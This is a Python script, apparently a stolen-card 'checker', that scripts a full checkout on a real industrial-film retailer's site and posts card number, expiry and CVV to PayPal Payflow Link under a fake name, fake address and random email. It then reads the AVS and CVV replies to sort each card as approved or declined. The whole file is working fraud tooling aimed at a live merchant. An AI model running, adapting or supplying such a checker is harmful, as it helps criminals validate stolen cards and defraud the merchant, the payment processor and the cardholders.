import random
import re
import names
from requests import Session
from dataclasses import dataclass

class ConfigsPAge:
    @classmethod
    def QueryText(self, data:str=None, chainOne:str=None, chainTwo:str=None):

        try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        except ValueError: return None 

    @classmethod
    def RandomName(self, dato: str = None):
        if dato == 'email':
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.email
        
        else:
            return 'Valores incorrectos: >>>   ConfigsPAge().RandomName("username")'

@dataclass
class avspfw1:
    def main(self, card):
        try:
            self.UseMail = ConfigsPAge().RandomName('email')
            self.card = card
            self.ccs = card.split('|')
            if self.ccs[0].startswith("4"): self.brand = "VI"
            if self.ccs[0].startswith("3"): self.brand = "AE"
            elif self.ccs[0].startswith("5"): self.brand = "MC"

            self.session = Session()

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-ES,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://cshyde.com/viewitems/films/all-categories-high-performance-film-delrin-film-2','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',}
            r1 = self.session.get('https://cshyde.com/item/films/all-categories-high-performance-film-delrin-film-2/45-30f-4',headers=headers,)

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','content-type': 'application/json; charset=UTF-8','origin': 'https://cshyde.com','priority': 'u=1, i','referer': 'https://cshyde.com/item/films/all-categories-high-performance-film-delrin-film-2/45-30f-4','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            json_data = {'items': [{'ItemID': 6494,'Quantity': '1','CategoryID': 3001251,'Inventory': None,'ItemNumber': '45-30F-4','OrderType': 1,},],'componentID': '1070','type': '1','addedFromPage': 'ItemDetail',}
            r2 = self.session.post('https://cshyde.com/addtocart', headers=headers, json=json_data)
            match = re.search(r'addtocart\?token=([^%]+)%2C%2C', r2.text)
            if match:token = match.group(1)
            match = re.search(r'recordids=(\d+)', r2.text)
            if match:record_id = match.group(1)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-ES,es;q=0.9','priority': 'u=0, i','referer': 'https://cshyde.com/item/films/all-categories-high-performance-film-delrin-film-2/45-30f-4','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',}
            params = {'token': f'{token},,','recordids': record_id,}
            r3 = self.session.get('https://cshyde.com/addtocart', params=params, headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-ES,es;q=0.9','priority': 'u=0, i','referer': 'https://cshyde.com/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',}
            params = {'token': f'{token},,','returnurl': 'https://cshyde.com/item/films/all-categories-high-performance-film-delrin-film-2/45-30f-4',}
            r4 = self.session.get('https://cart.thomasnet-navigator.com/cbcheckout/viewcart', params=params, headers=headers)

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','content-type': 'application/json; charset=UTF-8','origin': 'https://cart.thomasnet-navigator.com','priority': 'u=1, i','referer': f'https://cart.thomasnet-navigator.com/cbcheckout/viewcart?token={token}%2C%2C&returnurl=https%3A%2F%2Fcshyde.com%2Fitem%2Ffilms%2Fall-categories-high-performance-film-delrin-film-2%2F45-30f-4','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            params = {'token': f'{token},,','returnurl': 'https://cshyde.com/item/films/all-categories-high-performance-film-delrin-film-2/45-30f-4',}
            json_data = {'actionmode': 'estimate','items': None,'shipping': {'Addresses': [{'AddressType': '2','IsResidential': 'False','City': '','StateShortName': '','Zip': '10010','CountryShortName': '',},],'FreightOptions': [],'TaxExempt': '',},}
            r5 = self.session.post('https://cart.thomasnet-navigator.com/cbcheckout/viewcart',params=params,headers=headers,json=json_data,)

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','content-type': 'application/json; charset=UTF-8','origin': 'https://cart.thomasnet-navigator.com','priority': 'u=1, i','referer': f'https://cart.thomasnet-navigator.com/cbcheckout/viewcart?token={token}%2C%2C&returnurl=https%3A%2F%2Fcshyde.com%2Fitem%2Ffilms%2Fall-categories-high-performance-film-delrin-film-2%2F45-30f-4','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            params = {'token': f'{token},,','returnurl': 'https://cshyde.com/item/films/all-categories-high-performance-film-delrin-film-2/45-30f-4',}
            json_data = {'actionmode': 'proceedtocheckout','items': [{'ItemID': 6494,'PreviousQuantity': 1,'Quantity': '1','OrderID': 1199318,'RecordID': 283293,'MinOrderQty': 1,'ItemNumber': '45-30F-4','OrderType': 'Order',},],'shipping': {'TaxExempt': '',},}
            r6 = self.session.post('https://cart.thomasnet-navigator.com/cbcheckout/viewcart',params=params,headers=headers,json=json_data,)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-ES,es;q=0.9','priority': 'u=0, i','referer': f'https://cart.thomasnet-navigator.com/cbcheckout/viewcart?token={token}%2C%2C&returnurl=https%3A%2F%2Fcshyde.com%2Fitem%2Ffilms%2Fall-categories-high-performance-film-delrin-film-2%2F45-30f-4','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',}
            params = {'token': f'{token},,','returnurl': 'https://cshyde.com/item/films/all-categories-high-performance-film-delrin-film-2/45-30f-4',}
            r7 = self.session.get('https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling',params=params,headers=headers,)

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','content-type': 'application/json; charset=UTF-8','origin': 'https://cart.thomasnet-navigator.com','priority': 'u=1, i','referer': f'https://cart.thomasnet-navigator.com/cbcheckout/viewcart?token={token}%2C%2C&returnurl=https%3A%2F%2Fcshyde.com%2Fitem%2Ffilms%2Fall-categories-high-performance-film-delrin-film-2%2F45-30f-4','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            params = {'token': f'{token},,','returnurl': 'https://cshyde.com/item/films/all-categories-high-performance-film-delrin-film-2/45-30f-4',}
            json_data = {'actionmode': 'calculateshipping','items': None,'shipping': {'GeneralShippings': [{'ID': '','IsSelected': '','Name': 'UPS Ground','Rate': '15.3500','Handling': '2.50'},],'FreightShippings': [],'Addresses': [{'CID': 0,'WebUserID': 0,'AddressID': 0,'Name': None,'FirstName': None,'LastName': None,'CompanyName': None,'Address1': None,'Address2': None,'Address3': None,'City': 'NEW YORK','StateID': 34,'StateName': 'New York','StateShortName': 'NY','CountryID': 222,'CountryName': 'UNITED STATES OF AMERICA','CountryShortName': 'US','Zip': '10010','Phone': None,'Exn': None,'Fax': None,'Email': None,'AddressNumber': None,'IsResidential': False,'IsShippingDefault': None,'IsBillingDefault': None,'Comment': None,'IsInPromotionalList': None,'IsShip': None,'IsBill': None,'AddressType': 2,'Region': None,'IsEmpty': False,'IsValidPostal': True,},],'TaxExempt': '','FreightOptions': [],'GeneralShippingKey': '128-Actual-15.3500-2.50-4-0-0',},}
            r8 = self.session.post('https://cart.thomasnet-navigator.com/cbcheckout/viewcart',params=params,headers=headers,json=json_data,)


            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','content-type': 'application/json; charset=UTF-8','origin': 'https://cart.thomasnet-navigator.com','priority': 'u=1, i','referer': f'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling?token={token}%2C%2C&returnurl=https%3A%2F%2Fcshyde.com%2Fitem%2Ffilms%2Fall-categories-high-performance-film-delrin-film-2%2F45-30f-4','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            params = {'token': f'{token},,','returnurl': 'https://cshyde.com/item/films/all-categories-high-performance-film-delrin-film-2/45-30f-4',}
            json_data = {'actionmode': 'save','shipping': {'Addresses': [{'AddressType': '2','FirstName': 'deerek','LastName': 'delan','CompanyName': '','Address1': 'times%20square%2020','Address2': '','Address3': '','City': 'NEW%20YORK','StateShortName': 'NY','Region': '','State/Province_-_Shipping': '','CountryShortName': 'US','Zip': '10010','Phone': '5667879654','Fax': '','Email': self.UseMail,'AddressNumber': '',},],'FreightShippings': [],'GeneralShippings': [],'IsInternational': False,'IsCheckout': True,'IsFreight': False,'ErrorMessage': '','FreightOptions': [],'TaxExempt': None,'ShippingTotal': None,'HandlingTotal': None,'TaxTotal': 0,'Total': None,'GeneralShippingKey': '128-Actual-15.3500-2.50-4-0-0','IsOnlyFreightServices': False,'ShippingAccountNumber': '','IsValidAddress': True,},'isSaveAddress': False,}
            r9 = self.session.post('https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling',params=params,headers=headers,json=json_data,)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-ES,es;q=0.9','priority': 'u=0, i','referer': f'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling?token={token}%2C%2C&returnurl=https%3A%2F%2Fcshyde.com%2Fitem%2Ffilms%2Fall-categories-high-performance-film-delrin-film-2%2F45-30f-4','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',}
            params = {'token': f'{token},,','returnurl': 'https://cshyde.com/item/films/all-categories-high-performance-film-delrin-film-2/45-30f-4',}
            r10 = self.session.get('https://cart.thomasnet-navigator.com/cbcheckout/paymentoptions',params=params,headers=headers,)
            match = re.search(r'SecureTokenID=([^&"]+)', r10.text)
            if match:securetokenid = match.group(1)
            match = re.search(r'SecureToken=([^&"]+)', r10.text)
            if match:securetoken = match.group(1)

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-ES,es;q=0.9','content-type': 'application/json; charset=UTF-8','origin': 'https://cart.thomasnet-navigator.com','priority': 'u=1, i','referer': f'https://cart.thomasnet-navigator.com/cbcheckout/paymentoptions?token={token}%2C%2C&returnurl=https%3A%2F%2Fcshyde.com%2Fitem%2Ffilms%2Fall-categories-high-performance-film-delrin-film-2%2F45-30f-4','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            params = {'token': f'{token},,','returnurl': 'https://cshyde.com/item/films/all-categories-high-performance-film-delrin-film-2/45-30f-4',}
            json_data = {'isShippingAddress': True,'actionmode': 'save','shipping': {'Addresses': [{'AddressType': '2','FirstName': 'deerek','LastName': 'delan','CompanyName': '','Address1': 'times square 20','Address2': '','Address3': '','City': 'NEW YORK','StateShortName': 'NY','Region': '','State/Province_-_Shipping': '','CountryShortName': 'US','Zip': '10010','Phone': '5667879654','Fax': '','Email': self.UseMail,'AddressNumber': '',},],'FreightShippings': [],'GeneralShippings': [],'IsInternational': False,'IsCheckout': True,'IsFreight': False,'ErrorMessage': '','FreightOptions': [],'TaxExempt': None,'ShippingTotal': None,'HandlingTotal': None,'TaxTotal': 0,'Total': None,'GeneralShippingKey': '128-Actual-15.3500-2.50-4-0-0','IsOnlyFreightServices': False,'ShippingAccountNumber': '','IsValidAddress': True,},'payment': {'PaymentProviderID': '1048576','IsTermsAccept': True,},'isSaveAddress': False,}
            r11 = self.session.post('https://cart.thomasnet-navigator.com/cbcheckout/paymentoptions',params=params,headers=headers,json=json_data,)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-ES,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://payflowlink.paypal.com','priority': 'u=0, i','referer': f'https://payflowlink.paypal.com/?SecureTokenID={securetokenid}&SecureToken={securetoken}','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',}
            data = [('subaction', ''),('CARDNUM', self.ccs[0]),('EXPMONTH', self.ccs[1]),('EXPYEAR', self.ccs[2]),('CVV2', self.ccs[3]),('startdate_month', ''),('startdate_year', ''),('issue_number', ''),('METHOD', 'C'),('PAYMETHOD', 'C'),('FIRST_NAME', 'deerek'),('LAST_NAME', 'delan'),('template', ''),('ADDRESS', 'times+square+20++'),('CITY', 'NEW+YORK'),('STATE', 'NY'),('ZIP', '10010'),('COUNTRY', 'US'),('PHONE', ''),('EMAIL', ''),('SHIPPING_FIRST_NAME', 'deerek'),('SHIPPING_LAST_NAME', 'delan'),('ADDRESSTOSHIP', 'times+square+20++'),('CITYTOSHIP', 'NEW+YORK'),('STATETOSHIP', 'NY'),('ZIPTOSHIP', '10010'),('COUNTRYTOSHIP', 'US'),('PHONETOSHIP', ''),('EMAILTOSHIP', ''),('TYPE', 'A'),('SHIPAMOUNT', '0.00'),('TAX', '0.00'),('VERBOSITY', 'HIGH'),('flag3dSecure', ''),('CURRENCY', 'USD'),('STATE', 'NY'),('swipeData', '0'),('SECURETOKEN', securetoken),('SECURETOKENID', securetokenid),('PARMLIST', ''),('MODE', ''),('CSRF_TOKEN', '09cda571-e074-49c6-a596-3c76d8a83462'),('referringTemplate', 'minlayout'),]
            r12 = self.session.post('https://payflowlink.paypal.com/processTransaction.do', headers=headers, data=data)
            
            r7_text = r12.text
            
            respmsg = ConfigsPAge().QueryText(r7_text, 'name="RESPMSG" value="', '"') 
            try:
                avsresp = ConfigsPAge().QueryText(r7_text, 'name="AVSDATA" value="', '"')
            except IndexError:
                avsresp = None 
            try:
                cvvresp = ConfigsPAge().QueryText(r7_text, 'name="PROCCVV2" value="', '"') 
            except IndexError:
                cvvresp = None 
            if 'CVV2' in respmsg: 
                return 'Approved! ✅',f"{respmsg} | AVS: {avsresp} | CVV: {cvvresp}"
            else:
                return 'Declined! ❌',f"{respmsg} | AVS: {avsresp} | CVV: {cvvresp}"


        except: return 'Declined! ❌','Declined: 15005-This transaction cannot be processed.'

